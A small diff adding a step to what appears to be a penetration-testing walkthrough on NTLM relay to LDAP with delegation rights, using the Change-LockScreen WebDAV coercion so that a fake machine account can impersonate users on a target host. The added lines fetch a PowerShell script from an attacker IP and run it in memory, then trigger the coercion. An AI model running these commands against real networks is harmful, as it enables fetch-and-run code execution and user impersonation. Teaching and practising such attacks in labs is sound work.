@@ -91,6 +91,11 @@ python3 /opt/impacket/examples/ntlmrelayx.py -t ldap://10.0.0.3 --delegate-acces
 
 5\. Run the Change-LockScreen tool in the shell of WS01 and check the ntlmrelay output. The Change-LockScreen command will give an error but this doesn't matter:
 
+```
+iex (iwr http://192.168.248.3:8090/Change-Lockscreen.ps1 -usebasicparsing)
+change-lockscreen -webdav \\webdav@80\
+```
+
 ![](../../../.gitbook/assets/image.png)
 
 When we check the ntlmrelay output we see that `FAKE01` can now impersonate users on `WEB01`.
